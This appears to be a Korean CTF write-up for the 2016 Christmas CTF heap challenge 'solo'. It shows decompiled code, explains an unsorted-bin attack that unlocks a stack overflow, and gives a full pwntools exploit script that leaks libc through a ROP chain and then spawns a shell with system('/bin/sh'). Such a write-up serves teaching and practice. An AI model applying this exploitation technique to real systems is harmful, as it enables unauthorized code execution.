---
title: "2016 Christmas CTF Who is solo?"
date: 2020-1-19
tags: [Christmas]
categories: [Christmas]
---

64비트 바이너리고 Partial RELRO, NX, FORTIFY가 걸려있다.

```
[*] '/vagrant/ctfs/solo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

메뉴는 5가지고 전형적인 힙 문제의 메뉴다. 

```
1. malloc
2. free
3. list
4. login
5. exit
```

함수들은 아래와 같은 기능들을 한다.

```
sub_4008D0 : print menu
sub_400930 : malloc only 4 chunks
sub_400B60 : free chunk
```

메인함수다.

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+Ch] [rbp-42Ch]
  void *buf; // [rsp+10h] [rbp-428h]
  char v6; // [rsp+18h] [rbp-420h]
  char v7; // [rsp+20h] [rbp-418h]
  char v8; // [rsp+28h] [rbp-410h]
  char v9; // [rsp+30h] [rbp-408h]

  setvbuf(stdout, 0LL, 2, 0x400uLL);
  sub_4008B0();
  v4 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        do
        {
          sub_4008D0();
          __isoc99_scanf("%d", &v4);
        }
        while ( v4 == 3 );
        if ( v4 > 3 )
          break;
        if ( v4 == 1 )
        {
          sub_400930(&buf, &v6, &v7, &v8);      // 1. malloc
        }
        else
        {
          if ( v4 != 2 )
            return 0LL;
          sub_400B60(&buf, &v6, &v7, &v8);      // 2. free
        }
      }
      if ( v4 != 4 )
        break;
      if ( qword_602080 )                       // 4. login
      {
        __printf_chk(1LL, "Input password: ");
        read(0, &v9, 2000uLL);                  // vuln
      }
      else
      {
        puts("Login failed");
      }
    }
    if ( v4 != 0x31337 )
      break;
    __printf_chk(1LL, "Modify Data: ");
    read(0, buf, 300uLL);
  }
  return 0LL;
}
```

unsorted bin 취약점을 이용한 문제다. 

malloc(1,200,'AAAA'), malloc(2,200,'BBBB'), malloc(3,200,'CCCC') 할당

free(2) 해주면 fd,bk에는 main_arena+88주소가 적힌다. 

modify메뉴로 free된 2번 청크의 bk를 check해주는 (전역변수-16)로 덮어 fd,bk 조작해 원하는 주소에 값을 씀

전역변수 -16 해주는 이유는 unlink때 `FD->bk=BK; BK->fd=FD;`로 현재 chunk bk + 16위치에 현재 fd값이 들어가기 때문에 덮어쓸 주소 -16해준다. bk에 check -16을 넣어주면 unlink과정에서 check+0에 fd가 들어간다.

malloc(4,200,'DDDD) 할당

그러면 0으로 덮여있던 check는 main_arena + 88의 주소가 들어가있다.

Login 메뉴를 사용가능하다. 취약점 터지는 `read(0, &v9, 2000uLL);` 에서 rop해주면 됨.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
e = ELF('./solo')
p = process('./solo')
libc = e.libc
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
prdi = 0x00000000004008a0 # pop rdi ; ret
prsi_r15 = 0x0000000000400d11 # pop rsi ; pop r15 ; ret
check = 0x0000000000602080
main = 0x0000000000400680

# chunk max : 3
def malloc(num,size,data):
	sla('$','1')
	sla(':',str(num)) # Allocate Chunk Number:
	sla(':',str(size)) # Input Size:
	sa(':',data) # Input Data:

def free(num):
	sla('$','2')
	sla(':',str(num)) # Free Chunk number:

def modify(data):
	sla('$','201527')
	sa(':',data) # Modify Data:

def login(pay):
	sla('$','4')
	sla(':',pay) # Input password: 

def exit():
	sla('$','5')

# malloc -> num 1,2,3
malloc(1,200,'AAAAAAAA')
malloc(2,200,'BBBBBBBB')
malloc(3,200,'CCCCCCCC')
# free -> num 2
free(2)
#raw_input()
# modify -> num 2 -> bk(check - 16)
p1 = 'A'*200
p1 += p64(0xd1) # size
p1 += p64(0x0) # fd
p1 += p64(check - 0x10) # bk
modify(p1)
# malloc -> num 4
malloc(4,200,'DDDDDDDD')
p2 = 'A'*0x408
p2 += p64(prdi) + p64(check) + p64(e.plt['puts'])
p2 += p64(main)
login(p2) # leak main_arena + 88
exit()
libc_base = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - 88 - 0x3c4b20
log.info('libc_base : ' + hex(libc_base))
# system('/bin/sh')
p3 = 'A'*0x408
p3 += p64(prdi) + p64(libc_base + libc.search('/bin/sh\x00').next()) + p64(libc_base + libc.symbols['system'])
login(p3)
exit()

p.interactive()
```

